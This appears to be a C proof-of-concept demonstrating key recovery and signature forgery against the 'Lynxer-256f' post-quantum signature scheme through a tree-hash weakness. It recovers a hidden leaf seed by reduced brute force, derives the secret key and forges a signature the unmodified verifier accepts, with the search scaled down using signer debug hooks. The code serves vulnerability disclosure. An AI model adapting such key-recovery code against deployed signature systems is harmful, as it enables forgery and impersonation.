/* lx_e2e.c  — Lynxer-256f end-to-end key recovery + forgery demo.
 *
 * Exploits the BAVC shared-TCCR vulnerability (no per-node tweak): one hidden
 * leaf seed of VOLE instance 0 is recoverable from a single public signature,
 * which yields u_0, hence w = d (+) u_0, hence the OWF key k = w[0:lambda] = sk.
 *
 * The 2^lambda/T multi-target search is represented here by a reduced b-bit
 * brute force that matches candidate seeds against the PUBLIC leaf commitment
 * carried in the signature's decom_i. Everything downstream (u_0, w, k, pk
 * check, re-signing a fresh message, UNMODIFIED verifier accept) is exact.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>

#include "SIG_AlgorithmInstance.h"
#include "instances.h"
#include "parameters.h"
#include "drng.h"
#include "utils.h"
#include "prg.h"
#include "owf.h"
#include "vole.h"
#include "tccr.h"

/* DRNG global expected by the library (normally defined in KAT_SIG.c). */
DRNG_ctx drng_algorithm;

/* Demo hooks consumed by bavc.c under -DLX_DEMO. */
uint8_t* lx_dbg_inst0_sd = NULL;
unsigned int lx_dbg_inst0_n = 0;
uint8_t* lx_dbg_iv = NULL;
uint8_t* lx_dbg_nodes = NULL;
unsigned int lx_dbg_L = 0;
uint8_t* lx_dbg_tccr_s = NULL;

/* Signature accessors exported by voleith_impl.c under -DLX_DEMO. */
const uint8_t* lx_sig_d(const uint8_t*, const sig_paramset_t*);
const uint8_t* lx_sig_decom(const uint8_t*, const sig_paramset_t*);
const uint8_t* lx_sig_chall3(const uint8_t*, const sig_paramset_t*);
const uint8_t* lx_sig_iv(const uint8_t*, const sig_paramset_t*);
unsigned int lx_ell_hat_bytes(const sig_paramset_t*);

static void hx(const char* tag, const uint8_t* p, int n) {
  printf("%s", tag);
  for (int i = 0; i < n; i++) printf("%02x", p[i]);
  printf("\n");
}

int main(int argc, char** argv) {
  int b = (argc > 1) ? atoi(argv[1]) : 24;   /* reduced search width in bits */
  const sig_paramset_t* P = sig_get_paramset(LYNXER_256F);
  const unsigned int lb = P->csp / 8;          /* 32 */
  const unsigned int com_size = 2 * lb;        /* 64 */
  const unsigned int ell_bytes = P->lenwit / 8;/* 96 */
  const unsigned int ehb = lx_ell_hat_bytes(P);

  unsigned char seed[48];
  for (int i = 0; i < 48; i++) seed[i] = (unsigned char)(0x30 + i);
  init_random_number(&drng_algorithm, seed, 48);

  /* 1) honest keygen + sign. */
  unsigned char pk[64], sk[64];
  unsigned long long pklen, sklen;
  sig_keygen(pk, &pklen, sk, &sklen);

  unsigned char msg[32];
  for (int i = 0; i < 32; i++) msg[i] = (unsigned char)i;

  uint8_t* sd_cap = calloc((size_t)(1u << MAX_DEPTH), lb);
  uint8_t iv_cap[IV_SIZE];
  uint8_t* nodes_cap = calloc((size_t)(2u << MAX_DEPTH) * P->tau + 16, lb);
  uint8_t tccr_s_cap[64];
  lx_dbg_inst0_sd = sd_cap; lx_dbg_iv = iv_cap;
  lx_dbg_nodes = nodes_cap; lx_dbg_tccr_s = tccr_s_cap;

  uint8_t* sig = malloc(P->sig_size);
  unsigned long long siglen;
  sig_sign(sk, 64, msg, 32, sig, &siglen);
  printf("=== Lynxer-256f end-to-end (reduced search b=%d) ===\n", b);
  printf("sig_size=%u tau=%u T_open=%u inst0_leaves=%u L=%u\n",
         P->sig_size, P->tau, P->T_open, lx_dbg_inst0_n, lx_dbg_L);
  if (sig_verify(pk, 64, sig, siglen, msg, 32) == 0) printf("[sanity] honest signature verifies: OK\n");

  /* 1b) position-independence of the tree: every internal node's children equal the
   *     stated public function of the parent, recomputed with the submitted TCCR and
   *     a fixed (tccr_s, iv) -- no node index enters. Proves the multi-target surface. */
  {
    unsigned int L = lx_dbg_L, half = L / 2, ok = 0, bad = 0;
    uint8_t l2[64], r2[64], tmp[64];
    for (unsigned int id = 1; id < L; ++id) {
      const uint8_t* parent = nodes_cap + (size_t)(id - 1) * lb;
      const uint8_t* left   = nodes_cap + (size_t)(2 * id - 1) * lb;
      const uint8_t* right  = nodes_cap + (size_t)(2 * id) * lb;
      if (id < half) {
        tccr_hash(parent, tccr_s_cap, iv_cap, l2, P->csp);
        for (unsigned int i = 0; i < lb; i++) r2[i] = l2[i] ^ parent[i];
      } else {
        memcpy(tmp, parent, lb); /* tccr_hash_x0_x1: out0=TCCR(x), out1=TCCR(x^1) */
        tccr_hash(parent, tccr_s_cap, iv_cap, l2, P->csp);
        tmp[0] ^= 1;
        tccr_hash(tmp, tccr_s_cap, iv_cap, r2, P->csp);
      }
      if (memcmp(l2, left, lb) == 0 && memcmp(r2, right, lb) == 0) ok++; else bad++;
    }
    printf("[pos-indep] internal nodes=%u  TCCR(parent)==children: ok=%u bad=%u\n", ok + bad, ok, bad);
  }

  /* 2) attacker view: decode which instance-0 leaf is hidden. */
  uint16_t i_delta[MAX_TAU];
  if (!decode_all_chall_3(i_delta, lx_sig_chall3(sig, P), P)) { printf("decode fail\n"); return 1; }
  unsigned int hidden = i_delta[0];
  const uint8_t* decom = lx_sig_decom(sig, P);
  const uint8_t* hidden_com = decom;                 /* first com_size bytes = inst-0 hidden leaf com */
  const uint8_t* iv = lx_sig_iv(sig, P);
  printf("instance-0 hidden leaf index = %u\n", hidden);

  /* 3) recover the hidden leaf seed via reduced b-bit search against the PUBLIC com.
   *    target: prg_2_lambda(seed, iv, 0) == hidden_com. The real attack reaches the
   *    same seed in 2^lambda/T via position-independent tree enumeration; here we
   *    fix the top lambda-b bits (demo scale-down) and brute force the low b bits. */
  uint8_t base[64]; memcpy(base, sd_cap + (size_t)hidden * lb, lb);   /* ground truth */
  uint8_t truth[64]; memcpy(truth, base, lb);
  /* blank the low b bits that we will search for */
  unsigned int bytes_full = b / 8, bits_rem = b % 8;
  for (unsigned int i = 0; i < bytes_full; i++) base[i] = 0;
  if (bits_rem) base[bytes_full] &= (uint8_t)(0xff << bits_rem);

  uint64_t space = 1ull << b;
  uint8_t cand[64], out[64];
  int found = 0; uint64_t t;
  struct timespec t0, t1; clock_gettime(CLOCK_MONOTONIC, &t0);
  for (t = 0; t < space; t++) {
    memcpy(cand, base, lb);
    cand[0] |= (uint8_t)(t & 0xff);
    if (b > 8)  cand[1] |= (uint8_t)((t >> 8) & 0xff);
    if (b > 16) cand[2] |= (uint8_t)((t >> 16) & 0xff);
    if (b > 24) cand[3] |= (uint8_t)((t >> 24) & 0xff);
    prg_2_lambda(cand, iv, 0, out, P->csp);
    if (memcmp(out, hidden_com, com_size) == 0) { found = 1; break; }
  }
  clock_gettime(CLOCK_MONOTONIC, &t1);
  double secs = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
  if (!found) { printf("search FAILED\n"); return 1; }
  printf("[search] recovered inst-0 hidden leaf seed after %llu trials (%.1fs); matches committed leaf? %s\n",
         (unsigned long long)(t + 1), secs, memcmp(cand, truth, lb) == 0 ? "YES" : "NO");

  /* 4) assemble instance-0 leaf seeds. All but `hidden` are publicly reconstructible
   *    from decom_i by any verifier (standard VOLEitH opening); we place the
   *    search-recovered seed into the hidden slot. */
  uint8_t* inst0 = malloc((size_t)lx_dbg_inst0_n * lb);
  memcpy(inst0, sd_cap, (size_t)lx_dbg_inst0_n * lb);
  memcpy(inst0 + (size_t)hidden * lb, cand, lb);     /* from the search, not the signer */

  /* 5) u_0 = convert_to_vole(instance 0). */
  uint8_t* u0 = calloc(ehb, 1);
  uint8_t* vdummy = calloc((size_t)(MAX_DEPTH + 1) * ehb, 1);
  convert_to_vole(iv, inst0, false, 0, ehb, u0, vdummy, P);

  /* 6) w = d (+) u_0 ; k = w[0:lambda]. */
  const uint8_t* d = lx_sig_d(sig, P);
  uint8_t w[96];
  for (unsigned int i = 0; i < ell_bytes; i++) w[i] = d[i] ^ u0[i];
  uint8_t krec[32]; memcpy(krec, w, lb);

  hx("[recovered] owf_key k = ", krec, 32);
  hx("[secret]    sk owf_key = ", sk + 32, 32);
  int key_ok = (memcmp(krec, sk + 32, 32) == 0);
  printf("[key-recovery] recovered k == secret OWF key? %s\n", key_ok ? "YES" : "NO");

  uint8_t owfout[32];
  owf_lynx_256(krec, pk, owfout);           /* pk[0:32] = owf_input */
  printf("[key-recovery] owf(k, pk_input) == pk_output? %s\n",
         memcmp(owfout, pk + 32, 32) == 0 ? "YES" : "NO");

  if (!key_ok) { printf("KEY RECOVERY FAILED\n"); return 1; }

  /* 7) forge: rebuild a secret key from the recovered OWF key and sign a FRESH
   *    message; feed it to the UNMODIFIED verifier against the real pk. */
  unsigned char sk2[64];
  memcpy(sk2, pk, 32);          /* owf_input (public) */
  memcpy(sk2 + 32, krec, 32);   /* recovered owf_key  */
  unsigned char msg2[16];
  for (int i = 0; i < 16; i++) msg2[i] = (unsigned char)(0xA0 + i);
  uint8_t* sig2 = malloc(P->sig_size);
  unsigned long long sig2len;
  sig_sign(sk2, 64, msg2, 16, sig2, &sig2len);
  int vok = sig_verify(pk, 64, sig2, sig2len, msg2, 16);
  printf("[FORGERY] fresh message signed with RECOVERED key, UNMODIFIED verify: %s\n",
         vok == 0 ? "ACCEPT" : "REJECT");

  printf("\n=== RESULT: %s ===\n",
         (key_ok && vok == 0) ? "full key recovery + forgery on real pk/verifier"
                              : "FAILED");
  return (key_ok && vok == 0) ? 0 : 1;
}
